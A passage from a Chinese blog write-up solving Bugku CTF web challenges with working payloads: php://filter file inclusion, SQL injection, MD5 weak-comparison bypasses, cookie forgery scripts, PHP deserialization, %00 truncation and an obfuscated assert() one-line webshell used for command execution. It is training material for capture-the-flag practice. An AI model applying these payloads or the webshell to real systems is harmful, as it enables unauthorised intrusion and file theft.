+<h3 id="0x15-flag在index里"><a href="#0x15-flag在index里" class="headerlink" title="0x15 flag在index里"></a>0x15 flag在index里</h3><p>题目如图示<br><img src="\\Bugku-Web-Write-up\\0x15\\1.JPG" alt><br>点击链接后跳转到如图示地址<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x15\\2.JPG" alt><br>很明显存在文件包含，结合题目标题 flag在index里，构造payload：<code>http://123.206.87.240:8005/post/index.php?file=php://filter/read/convert.base64-encode/resource=index.php</code>获取index.php源码<br>将获取到的base64解码后得到网页源码,找到flag<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x15\\3.JPG" alt></p>
+<h3 id="0x16-输入密码查看flag"><a href="#0x16-输入密码查看flag" class="headerlink" title="0x16 输入密码查看flag"></a>0x16 输入密码查看flag</h3><p>题目如图<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x16\\1.JPG" alt><br>很明显，用Burp暴力破解,得到密码为13579<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x16\\2.JPG" alt><br>输入得flag：<code>flag{bugku-baopo-hah}</code></p>
+<h3 id="0x17-点击一百万次"><a href="#0x17-点击一百万次" class="headerlink" title="0x17 点击一百万次"></a>0x17 点击一百万次</h3><p>题目hints为:JavaScript<br>题目如图，每点击这个图片一次，数量加1，当数量为100万的时候出来flag<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x17\\1.JPG" alt><br>显然，不可能为了一个flag浪费一个鼠标233~<br>结合题目给的hints，于是查看前端关于点击的js代码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x17\\2.JPG" alt><br>分析可知，点击一次clicks加1，当clicks大于100万的时候，提交一个表单，value等于clicks的值，所以我们直接POST提交clicks即可。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x17\\3.JPG" alt></p>
+<h3 id="0x18-备份是个好习惯"><a href="#0x18-备份是个好习惯" class="headerlink" title="0x18 备份是个好习惯"></a>0x18 备份是个好习惯</h3><p>点击题目如图示,出现一段hash编码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x18\\1.JPG" alt><br>乍一看还以为是md5，算了下长度，发现是64位，但是前32位跟后32位是相同的。感觉有点奇怪，于是把前32位md5解密一下，发现是个空密码。所以这段编码估计是没有什么用了。那应该怎么做呢?<br>题目描述是备份是个好习惯猜测可能是备份文件泄露漏洞。于是访问index.php.bak，可以下载。于是打开备份文件查看源码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x18\\2.JPG" alt><br>分析一下，这里代码意思是，第11行获取url ?及?后的字符串,第12行去除?,第13行剩下字符串中的key替代成’’,第14行解析字符串，即将 key1=234&amp;key2=123解析成$key1=234、$key2=123。<br>到了这里就应该明白了，主要考察两个点，第一是13行处，绕过str_replace。绕过之后，来到第二处，md5弱类型比较。<br>对于第一个点，可以使用双写绕过，第二个点的话，可以利用两个字符串md5都是0e开头绕过，或者将key1 key2赋为两个不同数组进行绕过(md5不能对数组进行操作，会返回null=null)</p>
+<p>payload1: <code>http://123.206.87.240:8002/web16/index.php?kekeyy1=QNKCDZO&amp;kekeyy2=aabg7XSs</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x18\\3.png" alt><br>payload2: <code>http://123.206.87.240:8002/web16/index.php?kekeyy1[]=1&amp;kekeyy2[]=12</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x18\\4.JPG" alt></p>
+<h3 id="0x19-成绩单"><a href="#0x19-成绩单" class="headerlink" title="0x19 成绩单"></a>0x19 成绩单</h3><p>打开题目链接后,题目如图示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x19\\1.JPG" alt><br>简单的输入 1’、1’#测试后，发现存在sql注入漏洞，于是开始进行注入</p>
+<ol>
+<li>用order by测试出有4个字段<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x19\\2.JPG" alt></li>
+<li>union查看一下哪些字段可显示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x19\\3.JPG" alt></li>
+<li>爆表<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x19\\4.JPG" alt></li>
+<li>爆fl4g表的列<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x19\\5.JPG" alt></li>
+<li>爆flag值<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x19\\6.JPG" alt></li>
+</ol>
+<h2 id="入门题"><a href="#入门题" class="headerlink" title="入门题"></a>入门题</h2><h3 id="0x20-秋名山老司机"><a href="#0x20-秋名山老司机" class="headerlink" title="0x20 秋名山老司机"></a>0x20 秋名山老司机</h3><p>点进链接，题目如图示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x20\\1.JPG" alt><br>请在两秒内计算车速，很明显要用到python脚本。但计算出车速来应该怎么提交呢?于是多刷新几遍,发现题目偶尔会变成下图示，里面讲到了通过post提交参数value<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x20\\2.JPG" alt><br>于是写一个python脚本<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Author: Miracle778</span></span><br><span class="line"><span class="string">@LastEditors: Miracle778</span></span><br><span class="line"><span class="string">@Description: file content</span></span><br><span class="line"><span class="string">@Date: 2019-04-01 10:24:57</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-04-01 12:59:49</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(<span class="string">'http://123.206.87.240:8002/qiumingshan/'</span>)</span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'html.parser'</span>)</span><br><span class="line">exp = soup.find_all(<span class="string">'div'</span>)[<span class="number">0</span>].string[:<span class="number">-3</span>]</span><br><span class="line"><span class="comment"># print(exp)</span></span><br><span class="line">value = &#123;<span class="string">'value'</span>:eval(exp)&#125;</span><br><span class="line">r = s.post(<span class="string">'http://123.206.87.240:8002/qiumingshan/'</span>,data=value)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
+<p>利用bs4提取表达式并计算。然后使用POST提交<br>运行脚本即可得flag</p>
+<h3 id="0x21-速度要快"><a href="#0x21-速度要快" class="headerlink" title="0x21 速度要快"></a>0x21 速度要快</h3><p>题目点进去如图示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x21\\1.JPG" alt><br>没找到别的信息。<br>用burp看一下http头部跟页面源码，发现下图示信息。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x21\\2.JPG" alt><br>上图注释信息说明需要POST提交参数margin的值，margin的值估计就是头部中的flag。<br>将头部中的flag base64解密一下得到如下信息<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x21\\3.JPG" alt><br>于是进行POST提交 margin=NDk4MDQ2,用火狐hackbar提交后，提示说不够快<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x21\\4.JPG" alt><br>既然手工不够快，那就用python跑一下吧。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Author: Miracle778</span></span><br><span class="line"><span class="string">@LastEditors: Miracle778</span></span><br><span class="line"><span class="string">@Description: file content</span></span><br><span class="line"><span class="string">@Date: 2019-04-01 13:06:09</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-04-04 20:48:35</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">r = s.get(<span class="string">'http://123.206.87.240:8002/web6/'</span>)</span><br><span class="line">flag_header = r.headers[<span class="string">'flag'</span>].encode(<span class="string">'utf-8'</span>)</span><br><span class="line">flag_message = base64.b64decode(flag_header).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">tmp_list = flag_message.split(<span class="string">': '</span>)</span><br><span class="line">margin = base64.b64decode(tmp_list[<span class="number">-1</span>].encode(<span class="string">'utf-8'</span>)).decode()</span><br><span class="line">data = &#123;<span class="string">'margin'</span>:margin&#125;</span><br><span class="line"></span><br><span class="line">r = s.post(<span class="string">"http://123.206.87.240:8002/web6/"</span>,data=data)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure></p>
+<p>跑一下，出来结果<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x21\\5.JPG" alt></p>
+<h3 id="0x22-cookies欺骗"><a href="#0x22-cookies欺骗" class="headerlink" title="0x22 cookies欺骗"></a>0x22 cookies欺骗</h3><p>打开题目链接页面如下<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x22\\1.png" alt><br>页面一段字符，看上去也不像什么编码。于是找http头部看看有没有啥提示。但找了一圈并没有发现。<br>但是看到访问url时，发现有的猫腻，url两个参数，一个line、另一个filename，filename的值还用base64加密了一手。<br>于是将filename的值解密一下看看，解密结果为keys.txt。<br>直接访问keys.txt看一下。与前面内容一样<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x22\\1.jpg" alt><br>所以可以得出结论，前面index.php的两个参数line和filename可以用来读取网页源文件，于是将index.php用base64加密，line从0开始，将index.php一行行读出来。避免繁琐，可以写个python脚本。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Author: Miracle778</span></span><br><span class="line"><span class="string">@LastEditors: Miracle778</span></span><br><span class="line"><span class="string">@Description: 导出生成index.php</span></span><br><span class="line"><span class="string">@Date: 2019-04-01 13:37:02</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-04-01 14:01:33</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web11/index.php'</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># url.format(2)</span></span><br><span class="line">data = &#123;<span class="string">'filename'</span>:<span class="string">'aW5kZXgucGhw'</span>&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="comment"># r = requests.get(url+'?line=100',params=data)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    data[<span class="string">'line'</span>] = i</span><br><span class="line">    r = requests.get(url,params=data)</span><br><span class="line">    <span class="keyword">if</span> r.text == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += r.text</span><br><span class="line"></span><br><span class="line">f = open(<span class="string">'./Bugku/Web/cookies欺骗/index.php'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(res)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure></p>
+<p>得到index.php源码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x22\\2.JPG" alt><br>由index.php源码可知，只能通过filename读取file_list数组里的文件，而如果想读取keys.php的话，就需要构造cookie使得$_COOKIE[‘margin’]==’margin’成立。<br>于是再写一个python脚本，添加上Cookie值，将keys.php再导出来<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=UTF-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@Author: Miracle778</span></span><br><span class="line"><span class="string">@LastEditors: Miracle778</span></span><br><span class="line"><span class="string">@Description: 导出keys.php</span></span><br><span class="line"><span class="string">@Date: 2019-04-01 14:01:56</span></span><br><span class="line"><span class="string">@LastEditTime: 2019-04-01 14:11:45</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://123.206.87.240:8002/web11/index.php'</span></span><br><span class="line"><span class="comment"># 设置cookie不通过header</span></span><br><span class="line"><span class="comment"># header = &#123;'Cookie':&#123;"margin":"margin"&#125;&#125;</span></span><br><span class="line">cookie = &#123;<span class="string">'margin'</span>:<span class="string">'margin'</span>&#125;</span><br><span class="line">data = &#123;<span class="string">'filename'</span>:<span class="string">'a2V5cy5waHA='</span>&#125;</span><br><span class="line">res = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    data[<span class="string">'line'</span>] = i</span><br><span class="line">    r = requests.get(url,params=data,cookies=cookie)</span><br><span class="line">    <span class="keyword">if</span> r.text == <span class="string">''</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    res += r.text</span><br><span class="line"><span class="comment"># print(res)</span></span><br><span class="line">f = open(<span class="string">'./Bugku/Web/cookies欺骗/keys.php'</span>,<span class="string">'w'</span>)</span><br><span class="line">f.write(res)</span><br><span class="line">f.close</span><br></pre></td></tr></table></figure></p>
+<p>keys.php的源码如下图<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x22\\3.JPG" alt><br>得到flag</p>
+<h3 id="0x23-never-give-up"><a href="#0x23-never-give-up" class="headerlink" title="0x23 never give up"></a>0x23 never give up</h3><p>点进题目去，如图示<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x23\\1.JPG" alt><br>流程走一遍，查看源码及http头，在源码处发现提示：1p.html<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x23\\2.JPG" alt><br>访问一下，发现直接被重定向了。<br>于是只好查看1p.html的源代码,发现一段编码<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x23\\3.JPG" alt><br>解密后得到下面代码<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> Words =<span class="string">"&lt;script&gt;window.location.href='http://www.bugku.com';&lt;/script&gt; </span></span><br><span class="line"><span class="string">&lt;!--JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ==--&gt;"</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">OutWord</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">var</span> NewWords;</span><br><span class="line">NewWords = <span class="built_in">unescape</span>(Words);</span><br><span class="line"><span class="built_in">document</span>.write(NewWords);</span><br><span class="line">&#125; </span><br><span class="line">OutWord();</span><br></pre></td></tr></table></figure></p>
+<p>其余代码无关紧要，作用就是进行重定向。真正有用的是&lt;!–里这段base64编码，将这段编码先base64再url解码得到下面代码。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">";if(!$_GET['id'])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header('Location: hello.php?id=1');</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$id=$_GET['id'];</span></span><br><span class="line"><span class="string">$a=$_GET['a'];</span></span><br><span class="line"><span class="string">$b=$_GET['b'];</span></span><br><span class="line"><span class="string">if(stripos($a,'.'))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo 'no no no no no no no';</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">$data = @file_get_contents($a,'r');</span></span><br><span class="line"><span class="string">if($data=="</span>bugku is a nice plateform!<span class="string">" and $id==0 and strlen($b)&gt;5 and eregi("</span><span class="number">111</span><span class="string">".substr($b,0,1),"</span><span class="number">1114</span><span class="string">") and substr($b,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	require("</span>f4l2a3g.txt<span class="string">");</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print "</span>never never never give up !!!<span class="string">";</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>到这里就很明显了，传入a,b,id三个参数，分别满足if条件即可<br>在这里，a利用的是文件包含，用php://input协议传入数据;b利用ereg函数的%00截断以同时满足eregi(“111”.substr($b,0,1),”1114”) and substr($b,0,1)!=4这两个矛盾点;还有一个id == 0容易被忽略，本来我以为直接id=0就能绕过，这个条件是不是太简单了。后面发现id = 0的话，!$_GET[‘id’]就满足了，直接退出，根本就到不了后面，所以id还要利用一手php弱类型比较<br>所以最终payload为：<br>url: <code>http://123.206.87.240:8006/test/hello.php?id=0miracle778&amp;a=php://input&amp;b=%001234566</code><br>post:<code>bugku is a nice plateform!</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x23\\4.JPG" alt><br>当然也可以直接访问f4l2a3g.txt，233</p>
+<h3 id="0x24-welcome-to-bugkuctf"><a href="#0x24-welcome-to-bugkuctf" class="headerlink" title="0x24 welcome to bugkuctf"></a>0x24 welcome to bugkuctf</h3><p>点进题目去，F12审查一下元素<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x24\\1.JPG" alt><br>发现代码，简单审计后，发现可以文件包含。构造payload<br>url: <code>http://123.206.87.240:8006/test1//test1/?txt=php://input&amp;file=php://filter/read/convert.base64-encode/resource=hint.php</code><br>post: welcome to the bugkuctf<br>得到hint.php源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;<span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> $file;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span><span class="params">()</span></span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file); </span><br><span class="line">			<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">		<span class="keyword">return</span> (<span class="string">"good"</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>这里得到信息还是不够完善，于是将上面payload中的file更改一下，将index.php源码读出来<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$txt = $_GET[<span class="string">"txt"</span>];  </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];  </span><br><span class="line">$password = $_GET[<span class="string">"password"</span>];  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($txt)&amp;&amp;(file_get_contents($txt,<span class="string">'r'</span>)===<span class="string">"welcome to the bugkuctf"</span>))&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"hello friend!&lt;br&gt;"</span>;  </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123; </span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"不能现在就给你flag哦"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();  </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">        <span class="keyword">include</span>($file);   </span><br><span class="line">        $password = unserialize($password);  </span><br><span class="line">        <span class="keyword">echo</span> $password;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;<span class="keyword">else</span>&#123;  </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"you are not the number of bugku ! "</span>;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>由index.php代码分析来看，flag应该藏在flag.php里，但是通过文件包含应该是出不来，因为include前进行了一步正则匹配，file参数值不能含flag，双写flag也没能绕过去。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x24\\2.JPG" alt><br>所以文件包含是得不到flag的，往下看，发现$password = unserialize($password);终于第三个参数用到了。这里存在反序列化漏洞。具体参考:<a href="https://www.freebuf.com/column/151447.html" target="_blank" rel="noopener">php反序列化漏洞</a><br>于是可以构造payload<br>url: <code>http://123.206.87.240:8006/test1/?txt=php://input&amp;file=hint.php&amp;password=O:4:&quot;Flag&quot;:1:{s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;}</code><br>post: <code>welcome to the bugkuctf</code><br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x24\\3.JPG" alt></p>
+<h3 id="0x25-过狗一句话"><a href="#0x25-过狗一句话" class="headerlink" title="0x25 过狗一句话"></a>0x25 过狗一句话</h3><p>题目描述：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$poc=<span class="string">"a#s#s#e#r#t"</span>; </span><br><span class="line">$poc_1=explode(<span class="string">"#"</span>,$poc); </span><br><span class="line">$poc_2=$poc_1[<span class="number">0</span>].$poc_1[<span class="number">1</span>].$poc_1[<span class="number">2</span>].$poc_1[<span class="number">3</span>].$poc_1[<span class="number">4</span>].$poc_1[<span class="number">5</span>]; </span><br><span class="line">$poc_2($_GET[<span class="string">'s'</span>]) </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>实际就是 <code>assert($_GET[&#39;s&#39;])</code> 一句话木马<br>所以可以传入 s=cmd 进行命令执行<br>于是构造 s=print_r(scandir(‘./‘)) 进行文件扫描。<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x25\\1.JPG" alt><br>看到一个flag_xx.txt<br>直接访问即可<br><img src="/CTF/Bugku/Web/\Bugku-Web-Write-up\\0x25\\2.JPG" alt><br>或者构造 s=print_r(readfile(‘./flag_sm1skla1.txt’))读取</p>
+<hr>
+<p>今天先告一段落，下次再更…</p>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+      <div>
+        <div style="padding: 10px 0; margin: 20px auto; width: 90%; text-align: center;">
+  <div>ヾﾉ≧∀≦)o 来呀！快活呀！~</div>
+  <button id="rewardButton" disable="enable" onclick="var qr = document.getElementById(&quot;QR&quot;); if (qr.style.display === 'none') {qr.style.display='block';} else {qr.style.display='none'}">
+    <span>打赏</span>
+  </button>
+  <div id="QR" style="display: none;">
+
+    
+      <div id="wechat" style="display: inline-block">
+        <img id="wechat_qr" src="/images/wechatpay.jpg" alt="Miracle778 微信支付">
+        <p>微信支付</p>
+      </div>
+    
+
+    
+      <div id="alipay" style="display: inline-block">
+        <img id="alipay_qr" src="/images/alipay.jpg" alt="Miracle778 支付宝">
+        <p>支付宝</p>
+      </div>
+    
+
+    
+
+  </div>
+</div>
+
+      </div>
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Bugku/" rel="tag"><i class="fa fa-tag"></i> Bugku</a>
+          
+            <a href="/tags/Web/" rel="tag"><i class="fa fa-tag"></i> Web</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
